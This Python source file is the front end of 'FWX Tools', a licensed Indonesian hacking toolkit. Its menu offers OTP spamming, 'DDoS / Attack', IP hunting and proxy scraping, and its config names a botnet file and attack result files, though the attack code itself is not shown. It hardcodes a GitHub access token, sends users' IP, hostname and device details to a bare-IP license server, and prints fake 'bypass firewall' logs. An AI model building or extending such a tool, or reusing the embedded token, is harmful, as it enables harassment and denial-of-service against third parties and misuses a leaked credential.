#!/usr/bin/env python3
import os
import sys
import time
import json
import uuid
import csv
import socket
import platform
import subprocess
import requests
import re
import random
import string
import shutil
import threading
import urllib.parse
import urllib3
import asyncio
import datetime
from datetime import datetime as _dt
from datetime import timedelta
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Thread

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# =========================================================
# AUTO INSTALL
# =========================================================
def auto_install(pkg, imp=None):
    imp = imp or pkg
    try:
        __import__(imp)
    except ImportError:
        subprocess.check_call([
            sys.executable, "-m", "pip",
            "install", "--no-cache-dir", pkg
        ])


auto_install("requests")
auto_install("psutil")
auto_install("aiohttp")

import psutil
try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False


# =========================================================
# CONFIG (UTAMA)
# =========================================================
LICENSE_API = "http://172.235.246.158:5000"

CONFIG_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "device_config.json"
)

VERSION = "1.2.0"
AUTHOR = "FloXID"
LICENSE_INTERVAL = 5

# ── PASSWORD GATE (dari GitHub private repo) ─────────────
FLOX_PASS_URL = "https://raw.githubusercontent.com/FWX-Database/Database/main/password.txt"

GITHUB_TOKEN = "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"

FLOX_PASSWORD = os.environ.get("FLOX_PASS", "FWXTools")

# =========================================================
# DDOS MODULE CONFIG
# =========================================================
SETTINGS_FILE = "settings.json"
PREM_FILE = "prem.json"
BOTNET_FILE = "ddos/botnet.json"
PROXY_FILE = "proxy.txt"
METHODS_FILE = "methods.json"
OUTFILE = "hasil_attack.txt"
CSVFILE = "results_attack.csv"


# =========================================================
# COLORS
# =========================================================
class C:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    BLINK = '\033[5m'

    RED = '\033[91m'
    GREEN = '\033[92m'
    DGREEN = '\033[32m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'

    BG_GREEN = '\033[42m'
    BG_RED = '\033[41m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'


# Alias untuk ddos module
RESET = "\x1b[0m"
BOLD = "\x1b[1m"
DIM = "\x1b[2m"
GREEN_BG = "\x1b[42m"
RED_BG = "\x1b[41m"
BLUE_BG = "\x1b[44m"
MAGENTA_BG = "\x1b[45m"
WHITE = "\x1b[97m"
LIGHT_BLUE = "\x1b[94m"
RED = "\x1b[91m"
GREEN = "\x1b[92m"
YELLOW = "\x1b[93m"
CYAN = "\x1b[96m"
MAGENTA = "\x1b[95m"


# =========================================================
# HELPER
# =========================================================
def clear():
    os.system('clear' if os.name != 'nt' else 'cls')


def term_width():
    try:
        return shutil.get_terminal_size().columns
    except Exception:
        return 60


def hide_cursor():
    sys.stdout.write("\033[?25l")
    sys.stdout.flush()


def show_cursor():
    sys.stdout.write("\033[?25h")
    sys.stdout.flush()


def line(char="─", length=66, color=C.CYAN):
    print(f"{color}{char * length}{C.RESET}")


def center(text, width=66, color=""):
    visible = re.sub(r'\x1b\[[0-9;]*m', '', text)
    pad = max((width - len(visible)) // 2, 0)
    print(f"{color}{' ' * pad}{text}{C.RESET}")


def gradient_text(text, start=(80, 160, 255), end=(0, 255, 100)):
    lines = text.split("\n")
    steps = max(len(lines) - 1, 1)
    out = []
    for i, ln in enumerate(lines):
        t = i / steps
        r = int(start[0] + (end[0] - start[0]) * t)
        g = int(start[1] + (end[1] - start[1]) * t)
        b = int(start[2] + (end[2] - start[2]) * t)
        out.append(f"\x1b[38;2;{r};{g};{b}m{ln}{C.RESET}")
    return "\n".join(out)


# =========================================================
# FIGLET-LIKE ASCII BANNER
# =========================================================
def big_banner(text="FWX TOOLS"):
    ascii_map = {
        "A": [" █████╗ ", "██╔══██╗", "███████║", "██╔══██║", "██║  ██║", "╚═╝  ╚═╝"],
        "D": ["██████╗ ", "██╔══██╗", "██║  ██║", "██║  ██║", "██████╔╝", "╚═════╝ "],
        "E": ["███████╗", "██╔════╝", "█████╗  ", "██╔══╝  ", "███████╗", "╚══════╝"],
        "F": ["███████╗", "██╔════╝", "█████╗  ", "██╔══╝  ", "██║     ", "╚═╝     "],
        "G": [" ██████╗ ", "██╔════╝ ", "██║  ███╗", "██║   ██║", "╚██████╔╝", " ╚═════╝ "],
        "I": ["██╗", "██║", "██║", "██║", "██║", "╚═╝"],
        "L": ["██╗     ", "██║     ", "██║     ", "██║     ", "███████╗", "╚══════╝"],
        "N": ["███╗   ██╗", "████╗  ██║", "██╔██╗ ██║", "██║╚██╗██║", "██║ ╚████║", "╚═╝  ╚═══╝"],
        "O": [" ██████╗ ", "██╔═══██╗", "██║   ██║", "██║   ██║", "╚██████╔╝", " ╚═════╝ "],
        "S": ["███████╗", "██╔════╝", "███████╗", "╚════██║", "███████║", "╚══════╝"],
        "T": ["████████╗", "╚══██╔══╝", "   ██║   ", "   ██║   ", "   ██║   ", "   ╚═╝   "],
        "U": ["██╗   ██╗", "██║   ██║", "██║   ██║", "██║   ██║", "╚██████╔╝", " ╚═════╝ "],
        "W": ["██╗    ██╗", "██║    ██║", "██║ █╗ ██║", "██║███╗██║", "╚███╔███╔╝", " ╚══╝╚══╝ "],
        "X": ["██╗  ██╗", "╚██╗██╔╝", " ╚███╔╝ ", " ██╔██╗ ", "██╔╝ ██╗", "╚═╝  ╚═╝"],
        " ": ["        "] * 6,
    }
    rows = [""] * 6
    for ch in text.upper():
        glyph = ascii_map.get(ch, ascii_map[" "])
        for r in range(6):
            rows[r] += glyph[r] + "  "
    return "\n".join(rows)


# =========================================================
# HACKER LOADING
# =========================================================
def matrix_rain(duration=2.5, speed=0.05):
    cols = term_width()
    height = 20
    drops = [random.randint(0, height) for _ in range(cols)]
    chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノ"

    end_time = time.time() + duration
    hide_cursor()
    sys.stdout.write("\033[2J")
    sys.stdout.flush()

    try:
        while time.time() < end_time:
            out = []
            for y in range(height):
                line_chars = []
                for x in range(cols):
                    if drops[x] == y:
                        line_chars.append(f"{C.WHITE}{C.BOLD}{random.choice(chars)}{C.RESET}")
                    elif drops[x] - 1 == y:
                        line_chars.append(f"{C.GREEN}{random.choice(chars)}{C.RESET}")
                    elif drops[x] - 2 == y:
                        line_chars.append(f"{C.DGREEN}{random.choice(chars)}{C.RESET}")
                    else:
                        line_chars.append(" ")
                out.append("".join(line_chars))
            sys.stdout.write("\033[H" + "\n".join(out))
            sys.stdout.flush()

            for i in range(cols):
                if drops[i] > height and random.random() > 0.975:
                    drops[i] = 0
                drops[i] += 1
            time.sleep(speed)
    finally:
        show_cursor()


def hacker_loading(seconds=3.0, label="INITIALIZING"):
    total = 30
    start = time.time()
    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    spin_i = 0
    hide_cursor()
    try:
        while time.time() - start < seconds:
            elapsed = time.time() - start
            pct = min(100, int((elapsed / seconds) * 100))
            filled = int((pct / 100) * total)
            bar = "█" * filled + "░" * (total - filled)
            sp = spinner[spin_i % len(spinner)]
            spin_i += 1
            color_bar = C.GREEN if pct < 50 else (C.YELLOW if pct < 85 else C.CYAN)
            sys.stdout.write(
                f"\r{C.CYAN}{sp}{C.RESET} "
                f"{color_bar}{C.BOLD}[{bar}]{C.RESET} "
                f"{C.YELLOW}{pct:3d}%{C.RESET} "
                f"{C.DIM}{label}...{C.RESET}"
            )
            sys.stdout.flush()
            time.sleep(0.06)
        bar = "█" * total
        sys.stdout.write(
            f"\r{C.GREEN}{C.BOLD}[{bar}]{C.RESET} "
            f"{C.GREEN}{C.BOLD}100%{C.RESET} "
            f"{C.GREEN}✓ DONE{C.RESET}\n"
        )
        sys.stdout.flush()
    finally:
        show_cursor()


def type_text(text, delay=0.03, color=C.GREEN, end="\n"):
    for ch in text:
        sys.stdout.write(f"{color}{ch}{C.RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(end)
    sys.stdout.flush()


def hacker_log(msg, color=C.GREEN, prefix="[✓]"):
    ts = time.strftime("%H:%M:%S")
    sys.stdout.write(
        f"{C.DIM}[{ts}]{C.RESET} "
        f"{color}{C.BOLD}{prefix}{C.RESET} "
        f"{C.WHITE}{msg}{C.RESET}\n"
    )
    sys.stdout.flush()
    time.sleep(random.uniform(0.15, 0.4))


def loading_banner():
    art = f"""
{C.GREEN}{C.BOLD}
  ████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
     ██║   ██║   ██║██║   ██║██║     ███████╗
     ██║   ██║   ██║██║   ██║██║     ╚════██║
     ██║   ╚██████╔╝╚██████╔╝███████╗███████║
     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
{C.RESET}
{C.CYAN}           ⚡ LOADING MODE ⚡{C.RESET}
{C.DIM}      ─────────────────────────────────{C.RESET}
"""
    print(art)


# =========================================================
# PASSWORD GATE
# =========================================================
def _fetch_remote_password():
    """Ambil password dari GitHub raw URL (support private repo pakai token)."""
    if not FLOX_PASS_URL:
        return None
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 FWX - Tools",
            "Cache-Control": "no-cache"
        }
        # Pakai token untuk akses private repo
        if GITHUB_TOKEN:
            headers["Authorization"] = f"token {GITHUB_TOKEN}"

        r = requests.get(FLOX_PASS_URL, timeout=10, headers=headers)
        if r.status_code == 200:
            pwd = r.text.strip().split("\n")[0].strip()
            if pwd:
                return pwd
        print(f"{C.YELLOW}[!] Gagal ambil password dari GitHub "
              f"(HTTP {r.status_code}){C.RESET}")
        return None
    except requests.exceptions.Timeout:
        print(f"{C.YELLOW}[!] Timeout ambil password dari GitHub{C.RESET}")
        return None
    except requests.exceptions.ConnectionError:
        print(f"{C.YELLOW}[!] Tidak bisa connect ke GitHub{C.RESET}")
        return None
    except Exception as e:
        print(f"{C.YELLOW}[!] Error fetch password: {e}{C.RESET}")
        return None


def password_gate():
    clear()

    banner_text = big_banner("FWX TOOLS")
    print(gradient_text(banner_text, (80, 160, 255), (0, 255, 100)))
    print()
    print(f"{C.GREEN}[ SYSTEM ]{C.RESET} Welcome To FWX Tools")
    print(f"{C.GREEN}[ SYSTEM ]{C.RESET} Owner: FloXID")
    print()
    line()
    print()

    print(f"{C.CYAN}[ SYSTEM ]{C.RESET} Connecting to auth server...")

    remote_pwd = _fetch_remote_password()

    if remote_pwd:
        correct = remote_pwd
        print(f"{C.GREEN}[ SYSTEM ]{C.RESET} Auth server connected ✓")
    else:
        correct = FLOX_PASSWORD
        print(f"{C.YELLOW}[ SYSTEM ]{C.RESET} Using local password (offline mode)")

    print()

    attempts = 0
    max_attempts = 3

    while attempts < max_attempts:
        try:
            key = input(
                f"{C.BOLD}{C.CYAN}Enter Key: {C.RESET}"
            ).strip()
        except (KeyboardInterrupt, EOFError):
            print(f"\n{C.YELLOW}[!] Dibatalkan.{C.RESET}")
            sys.exit(0)

        if not key:
            print(f"{C.RED}[!] Key tidak boleh kosong.{C.RESET}")
            attempts += 1
            continue

        sys.stdout.write(f"{C.DIM}Verifying")
        for _ in range(3):
            sys.stdout.write(".")
            sys.stdout.flush()
            time.sleep(0.35)
        print(f"{C.RESET}")

        if key == correct:
            print(f"\n{C.GREEN}{C.BOLD}✔ Successfully Logged{C.RESET}")
            time.sleep(0.6)
            return True
        else:
            attempts += 1
            sisa = max_attempts - attempts
            print(
                f"{C.RED}✘ Wrong Key!{C.RESET} "
                f"{C.DIM}(sisa percobaan: {sisa}){C.RESET}"
            )
            time.sleep(0.8)

    print(f"\n{C.RED}{C.BOLD}🚫 Terlalu banyak percobaan. Keluar.{C.RESET}")
    sys.exit(1)


# =========================================================
# PLAY INTRO
# =========================================================
def play_intro(duration_matrix=2.5):
    try:
        matrix_rain(duration=duration_matrix)
        clear()
        loading_banner()
        type_text(">>> Booting system...", 0.02, C.CYAN)
        time.sleep(0.3)
        hacker_loading(seconds=3.0, label="LOADING TOOLS")

        logs = [
            ("Menginisialisasi modul...", C.GREEN, "[✓]"),
            ("Memuat konfigurasi...", C.GREEN, "[✓]"),
            ("Mengecek dependencies...", C.GREEN, "[✓]"),
            ("Menghubungkan ke server...", C.CYAN, "[→]"),
            ("Enkripsi data...", C.YELLOW, "[🔒]"),
            ("Validasi token...", C.GREEN, "[✓]"),
            ("Bypass firewall...", C.RED, "[⚡]"),
            ("Akses diberikan!", C.GREEN, "[✓]"),
        ]
        for msg, col, pfx in logs:
            hacker_log(msg, col, pfx)

        print()
        type_text("✅ TOOLS SIAP DIGUNAKAN!", 0.04, C.GREEN + C.BOLD)
        print(f"{C.DIM}{'─' * term_width()}{C.RESET}\n")
        time.sleep(0.5)

    except KeyboardInterrupt:
        show_cursor()
        print(f"\n{C.YELLOW}[!] Animasi di-skip.{C.RESET}")
    finally:
        show_cursor()


# =========================================================
# PUBLIC IP
# =========================================================
def get_public_ip():
    services = [
        "https://ifconfig.me/ip",
        "https://api.ipify.org",
    ]
    for url in services:
        try:
            r = requests.get(url, timeout=5, headers={"User-Agent": "FWX - Tools"})
            ip = r.text.strip()
            if ip:
                return ip
        except Exception:
            continue
    return "Unknown"


# =========================================================
# ANDROID DEVICE MODEL
# =========================================================
def get_device_model():
    try:
        model = subprocess.check_output(
            ["getprop", "ro.product.model"], text=True, timeout=3
        ).strip()
        if model:
            return model
    except Exception:
        pass
    try:
        brand = subprocess.check_output(
            ["getprop", "ro.product.brand"], text=True, timeout=3
        ).strip()
        device = subprocess.check_output(
            ["getprop", "ro.product.device"], text=True, timeout=3
        ).strip()
        if brand and device:
            return f"{brand} {device}"
    except Exception:
        pass
    return "Unknown"


# =========================================================
# DEVICE INFO
# =========================================================
def get_device_info():
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        local_ip = "127.0.0.1"

    public_ip = get_public_ip()
    model = get_device_model()

    try:
        os_name = f"{platform.system()} {platform.release()}"
    except Exception:
        os_name = "Unknown"

    cpu_count = os.cpu_count() or 0
    try:
        cpu_freq = psutil.cpu_freq()
        cpu_mhz = round(cpu_freq.current, 0) if cpu_freq else 0
    except Exception:
        cpu_mhz = 0

    try:
        mem = psutil.virtual_memory()
        mem_total = round(mem.total / (1024 ** 3), 2)
        mem_used = round(mem.used / (1024 ** 3), 2)
        mem_percent = mem.percent
    except Exception:
        mem_total = mem_used = mem_percent = 0

    battery_info = {
        "percent": "N/A", "charging": "N/A", "source": "N/A",
        "temp": "N/A", "volt": "N/A", "health": "N/A"
    }

    try:
        result = subprocess.run(
            ["termux-battery-status"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            bat = json.loads(result.stdout)

            percentage = bat.get("percentage")
            if percentage is not None:
                battery_info["percent"] = f"{percentage}%"

            status = str(bat.get("status", "N/A")).upper()
            if status == "CHARGING":
                battery_info["charging"] = "Yes ⚡"
            elif status == "DISCHARGING":
                battery_info["charging"] = "No 🔋"
            elif status == "FULL":
                battery_info["charging"] = "Full 🔋"
            elif status:
                battery_info["charging"] = status

            plugged = bat.get("plugged")
            battery_info["source"] = str(plugged).upper() if plugged else "NONE"

            temperature = bat.get("temperature")
            if temperature is not None:
                battery_info["temp"] = f"{temperature}°C"

            voltage = bat.get("voltage")
            if voltage is not None:
                battery_info["volt"] = f"{voltage}mV"

            health = bat.get("health")
            if health:
                battery_info["health"] = str(health)
    except Exception:
        pass

    return {
        "ip": public_ip,
        "local_ip": local_ip,
        "hostname": hostname,
        "model": model,
        "os": os_name,
        "cpu": f"({cpu_count}) @ {cpu_mhz}MHz",
        "memory": f"{mem_used} GB / {mem_total} GB ({mem_percent}%)",
        "battery": battery_info
    }


# =========================================================
# DEVICE CONFIG
# =========================================================
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return None


def save_config(cfg):
    try:
        with open(CONFIG_FILE, "w") as f:
            json.dump(cfg, f, indent=2)
    except Exception as e:
        print(f"{C.RED}Gagal menyimpan config: {e}{C.RESET}")


def generate_device_key():
    return "FX-" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=8)
    )


# =========================================================
# LICENSE CHECK
# =========================================================
def check_license(device_key, buyer=None, seller=None):
    try:
        payload = {"device_key": device_key}
        if buyer is not None:
            payload["buyer"] = buyer
        if seller is not None:
            payload["seller"] = seller

        r = requests.post(
            f"{LICENSE_API}/check",
            json=payload,
            timeout=10
        )
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        return {"status": "offline",
                "message": f"Tidak dapat terhubung ke License API: {LICENSE_API}"}
    except requests.exceptions.Timeout:
        return {"status": "error", "message": "License API timeout."}
    except Exception as e:
        return {"status": "error", "message": str(e)}


# =========================================================
# REGISTER DEVICE
# =========================================================
def register_device(device_key, buyer, seller, info):
    try:
        payload = {
            "device_key": device_key,
            "buyer": buyer,
            "seller": seller,
            "device_info": info
        }
        for k in ("model", "os", "ip", "local_ip", "hostname",
                  "cpu", "memory", "battery"):
            if k in info:
                payload[k] = info[k]

        r = requests.post(
            f"{LICENSE_API}/register",
            json=payload,
            timeout=10
        )
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        return {"status": "error",
                "message": f"Tidak dapat terhubung ke License API: {LICENSE_API}"}
    except requests.exceptions.Timeout:
        return {"status": "error", "message": "License API timeout."}
    except Exception as e:
        return {"status": "error", "message": str(e)}


# =========================================================
# BANNER (main)
# =========================================================
def get_ascii_logo():
    M = C.MAGENTA
    R = C.RESET
    return (
        f"{M}       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄        {R}\n"
        f"{M}     ▄█████████████████████▄      {R}\n"
        f"{M}   ▄██████▀         ▀███████▄    {R}\n"
        f"{M}  ██████▀  ▄▄▄▄▄▄▄▄▄  ▀██████   {R}\n"
        f"{M} ██████   ███████████   ██████  {R}\n"
        f"{M}██████   ████     ████   ██████ {R}\n"
        f"{M}██████   ████     ████   ██████ {R}\n"
        f"{M}██████   ████     ████   ██████ {R}\n"
        f"{M} ██████   ███████████   ██████  {R}\n"
        f"{M}  ██████▄  ▀▀▀▀▀▀▀▀▀  ▄██████   {R}\n"
        f"{M}   ▀██████▄         ▄██████▀    {R}\n"
        f"{M}     ▀█████████████████████▀      {R}\n"
        f"{M}       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀        {R}"
    )


# =========================================================
# SHOW BANNER
# =========================================================
def show_banner(user_info, device_info, device_key, user_count):
    clear()
    logo_lines = get_ascii_logo().split("\n")

    right = [
        f"{C.GREEN}███   FWX - Tools{C.RESET}",
        f"{C.CYAN}──────────────────────────{C.RESET}",
         f"{C.YELLOW}⚡{C.RESET} {C.BOLD}Author  :{C.RESET} {AUTHOR}",
        f"{C.YELLOW}⚡{C.RESET} {C.BOLD}Name    :{C.RESET} {user_info.get('name', 'Guest')}",
        f"{C.YELLOW}⚡{C.RESET} {C.BOLD}Version :{C.RESET} {VERSION}",
        f"{C.YELLOW}⚡{C.RESET} {C.BOLD}Users   :{C.RESET} {user_count}",
    ]

    max_lines = max(len(logo_lines), len(right))
    for i in range(max_lines):
        left = logo_lines[i] if i < len(logo_lines) else ""
        r = right[i] if i < len(right) else ""
        print(f"{left}  {r}")

    print()

    ip_value = str(device_info.get("ip", "Unknown"))
    ip_display = ip_value[:18] + "xxxxx" if len(ip_value) > 18 else ip_value

    print(f"{C.CYAN}┌────────────────────────────┬────────────────────────────┐{C.RESET}")
    print(f"{C.CYAN}│{C.RESET} {C.BOLD}IP{C.RESET}      : {C.WHITE}{ip_display:<16}{C.RESET}{C.CYAN}│{C.RESET} {C.BOLD}DEVICE{C.RESET} : {C.GREEN}{device_key:<13}{C.RESET}{C.CYAN}│{C.RESET}")
    print(f"{C.CYAN}└────────────────────────────┴────────────────────────────┘{C.RESET}")

    center(f"{C.MAGENTA}[ D E V I C E ]{C.RESET}")

    print(f"{C.CYAN}┌────────────────────────────┬────────────────────────────┐{C.RESET}")
    print(f"{C.CYAN}│{C.RESET} {C.BOLD}OS{C.RESET}      : {C.WHITE}{device_info.get('os', 'Unknown')[:16]:<16}{C.RESET}{C.CYAN}│{C.RESET} {C.BOLD}CPU{C.RESET}     : {C.WHITE}{device_info.get('cpu', 'Unknown')[:16]:<16}{C.RESET}{C.CYAN}│{C.RESET}")
    print(f"{C.CYAN}│{C.RESET} {C.BOLD}HOST{C.RESET}    : {C.WHITE}{device_info.get('hostname', 'Unknown')[:16]:<16}{C.RESET}{C.CYAN}│{C.RESET} {C.BOLD}MEMORY{C.RESET}  : {C.WHITE}{device_info.get('memory', 'Unknown')[:16]:<16}{C.RESET}{C.CYAN}│{C.RESET}")
    print(f"{C.CYAN}└────────────────────────────┴────────────────────────────┘{C.RESET}")

    bat = device_info.get("battery", {})
    print(f"{C.CYAN}┌──────────────────────────────────────────────────────────┐{C.RESET}")
    print(f"{C.CYAN}│{C.RESET} {C.BOLD}BATERAI{C.RESET}  : {C.GREEN}{str(bat.get('percent', 'N/A')):<10}{C.RESET} {C.BOLD}CHARGING{C.RESET} : {C.GREEN}{str(bat.get('charging', 'N/A')):<10}{C.RESET}       {C.CYAN}│{C.RESET}")
    print(f"{C.CYAN}│{C.RESET} {C.BOLD}SOURCE{C.RESET}   : {C.WHITE}{str(bat.get('source', 'N/A')):<10}{C.RESET} {C.BOLD}TEMP{C.RESET}     : {C.YELLOW}{str(bat.get('temp', 'N/A')):<10}{C.RESET}       {C.CYAN}│{C.RESET}")
    print(f"{C.CYAN}│{C.RESET} {C.BOLD}VOLT{C.RESET}     : {C.WHITE}{str(bat.get('volt', 'N/A')):<10}{C.RESET} {C.BOLD}HEALTH{C.RESET}   : {C.GREEN}{str(bat.get('health', 'N/A')):<10}{C.RESET}       {C.CYAN}│{C.RESET}")
    print(f"{C.CYAN}└──────────────────────────────────────────────────────────┘{C.RESET}")

    date_str = _dt.now().strftime("%d-%m-%Y")
    print(f"{C.BG_BLUE}{C.WHITE} {date_str} | {AUTHOR} And Wenzz | FWX - Tools V {VERSION} | ENJOY BRO {C.RESET}")


# =========================================================
# MENU
# =========================================================
def main_menu():
    center(f"{C.MAGENTA}[ M E N U ]{C.RESET}")
    print()
    print(f"  {C.GREEN}[01]{C.RESET} {C.WHITE}Spam OTP{C.RESET}              {C.GREEN}[04]{C.RESET} {C.WHITE}Proxy Scraper{C.RESET}")
    print(f"  {C.GREEN}[02]{C.RESET} {C.WHITE}IP Hunter{C.RESET}             {C.GREEN}[05]{C.RESET} {C.WHITE}Device Info{C.RESET}")
    print(f"  {C.GREEN}[03]{C.RESET} {C.WHITE}DDoS / Attack{C.RESET}         {C.GREEN}[00]{C.RESET} {C.WHITE}Exit{C.RESET}")
    print()
    line()
    try:
        ch = input(f"{C.CYAN} ┌─[{C.RESET}{C.GREEN} P I L I H {C.RESET}{C.CYAN}]\n └──➤ {C.RESET}").strip()
        return ch
    except (KeyboardInterrupt, EOFError):
        return "00"


# =========================================================
# REGISTRATION
# =========================================================
def registration_flow(info):
    clear()
    show_banner({"name": "Guest"}, info, "NEW-DEVICE", 0)

    print(f"\n{C.YELLOW}╔══════════════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.YELLOW}║  {C.BOLD}{C.WHITE}🆕 FIRST TIME SETUP - DEVICE REGISTRATION{C.RESET}{C.YELLOW}               ║{C.RESET}")
    print(f"{C.YELLOW}╚══════════════════════════════════════════════════════════╝{C.RESET}\n")

    buyer = input(f"{C.CYAN}┌─{C.RESET} {C.BOLD}Buyer Username{C.RESET} : ").strip()
    if not buyer:
        print(f"{C.RED}┌─[!] Nama tidak boleh kosong!{C.RESET}")
        time.sleep(2)
        return None

    seller = input(f"{C.CYAN}┌─{C.RESET} {C.BOLD}Seller Username{C.RESET} : ").strip() or "FloX"
    device_key = generate_device_key()

    print(f"\n{C.YELLOW}[*] Mendaftarkan perangkat ke server...{C.RESET}")
    print(f"{C.CYAN}    Device Key : {C.GREEN}{device_key}{C.RESET}")
    print(f"{C.CYAN}    Buyer      : {C.WHITE}{buyer}{C.RESET}")
    print(f"{C.CYAN}    Seller     : {C.WHITE}{seller}{C.RESET}\n")

    hacker_loading(seconds=1.5, label="REGISTERING DEVICE")

    result = register_device(device_key, buyer, seller, info)
    status = result.get("status", "error")

    if status in ("success", "pending"):
        print(f"{C.YELLOW}╔══════════════════════════════════════════════════════════╗{C.RESET}")
        print(f"{C.YELLOW}║  {C.BOLD}{C.WHITE}⏳ MENUNGGU APPROVAL DARI OWNER{C.RESET}{C.YELLOW}                        ║{C.RESET}")
        print(f"{C.YELLOW}╚══════════════════════════════════════════════════════════╝{C.RESET}")
        print(f"\n{C.CYAN}📱 Device Key kamu:{C.RESET} {C.GREEN}{C.BOLD}{device_key}{C.RESET}")
        print(f"{C.DIM}Kirim Device Key ini ke Owner untuk di-approve.{C.RESET}\n")

        cfg = {
            "device_key": device_key,
            "buyer": buyer,
            "seller": seller,
            "registered_at": _dt.now().isoformat(),
            "status": "pending"
        }
        save_config(cfg)
        return cfg

    elif status == "approved":
        cfg = {
            "device_key": device_key,
            "buyer": buyer,
            "seller": seller,
            "registered_at": _dt.now().isoformat(),
            "status": "approved"
        }
        save_config(cfg)
        print(f"{C.GREEN}✅ Device langsung di-approve!{C.RESET}")
        time.sleep(2)
        return cfg

    elif status == "blocked":
        print(f"{C.RED}╔══════════════════════════════════════════════════════════╗{C.RESET}")
        print(f"{C.RED}║  {C.BOLD}{C.WHITE}🚫 DEVICE DI-BLOCKED!{C.RESET}{C.RED}                                  ║{C.RESET}")
        print(f"{C.RED}╚══════════════════════════════════════════════════════════╝{C.RESET}")
        sys.exit(1)

    else:
        print(f"{C.RED}[!] Gagal register: {result.get('message', 'Unknown')}{C.RESET}")
        time.sleep(2)
        return None


# =========================================================
# WAITING APPROVAL
# =========================================================
def waiting_approval(cfg):
    clear()
    print(f"\n{C.YELLOW}╔══════════════════════════════════════════════════════════╗{C.RESET}")
    print(f"{C.YELLOW}║  {C.BOLD}{C.WHITE}⏳ MENUNGGU APPROVAL DARI OWNER{C.RESET}{C.YELLOW}                        ║{C.RESET}")
    print(f"{C.YELLOW}╚══════════════════════════════════════════════════════════╝{C.RESET}")
    print(f"\n{C.CYAN}📱 Device Key : {C.GREEN}{C.BOLD}{cfg['device_key']}{C.RESET}")
    print(f"{C.CYAN}👤 Buyer      : {C.WHITE}{cfg['buyer']}{C.RESET}")
    print(f"{C.DIM}\nMenunggu approval... (cek setiap 5 detik){C.RESET}")
    print(f"{C.DIM}Tekan CTRL+C untuk keluar.{C.RESET}\n")

    try:
        while True:
            result = check_license(cfg["device_key"], cfg["buyer"], cfg["seller"])
            status = result.get("status", "error")

            if status == "approved":
                cfg["status"] = "approved"
                save_config(cfg)
                print(f"\n{C.GREEN}╔══════════════════════════════════════════════════════════╗{C.RESET}")
                print(f"{C.GREEN}║  {C.BOLD}{C.WHITE}✅ DEVICE APPROVED! Akses dibuka.{C.RESET}{C.GREEN}                 ║{C.RESET}")
                print(f"{C.GREEN}╚══════════════════════════════════════════════════════════╝{C.RESET}\n")
                time.sleep(2)
                return True

            elif status == "blocked":
                print(f"\n{C.RED}[!] Device diblokir owner!{C.RESET}")
                sys.exit(1)

            elif status in ("not_found",):
                print(f"\n{C.RED}[!] Device tidak ditemukan.{C.RESET}")
                sys.exit(1)

            elif status in ("pending",):
                print(f"{C.YELLOW}[{_dt.now().strftime('%H:%M:%S')}] Menunggu approval...{C.RESET}")
                time.sleep(5)

            elif status in ("offline",):
                print(f"{C.RED}[!] License API offline, retrying...{C.RESET}")
                time.sleep(5)

            else:
                print(f"{C.RED}[!] Error: {result.get('message', 'Unknown')}{C.RESET}")
                time.sleep(5)

    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[!] Keluar.{C.RESET}")
        sys.exit(0)


# =========================================================
# STARTUP CHECK
# =========================================================
def startup_check(cfg):
    result = check_license(cfg["device_key"], cfg["buyer"], cfg["seller"])
    status = result.get("status", "error")

    if status == "approved":
        cfg["status"] = "approved"
        save_config(cfg)
        return True

    elif status == "blocked":
        print(f"{C.RED}🚫 Device kamu diblokir oleh Owner!{C.RESET}")
        time.sleep(3)
        sys.exit(1)

    elif status == "pending":
        return waiting_approval(cfg)

    elif status == "not_found":
        print(f"{C.RED}❌ Device tidak ditemukan di server.{C.RESET}")
        time.sleep(3)
        sys.exit(1)

    else:
        print(f"{C.YELLOW}⚠️ Gagal cek lisensi, coba lagi...{C.RESET}")
        time.sleep(2)
        return waiting_approval(cfg)


# =========================================================
# LIVE LICENSE MONITOR
# =========================================================
def license_monitor(cfg):
    device_key = cfg["device_key"]

    while True:
        try:
            result = check_license(device_key)
            status = result.get("status")

            if status == "blocked":
                clear()
                print()
                print(f"{C.RED}{C.BOLD}╔════════════════════════════════════╗{C.RESET}")
                print(f"{C.RED}{C.BOLD}║       🚫 DEVICE DIBLOKIR           ║{C.RESET}")
                print(f"{C.RED}{C.BOLD}╚════════════════════════════════════╝{C.RESET}")
                print()
                print(f"🔑 Device Key: {device_key}")
                print()
                print(f"{C.RED}Owner telah memblokir license device ini.{C.RESET}")
                print()
                os._exit(1)

            if status == "not_found":
                clear()
                print(f"{C.RED}{C.BOLD}❌ LICENSE TIDAK DITEMUKAN{C.RESET}")
                os._exit(1)

        except Exception:
            pass

        time.sleep(LICENSE_INTERVAL)


# =========================================================
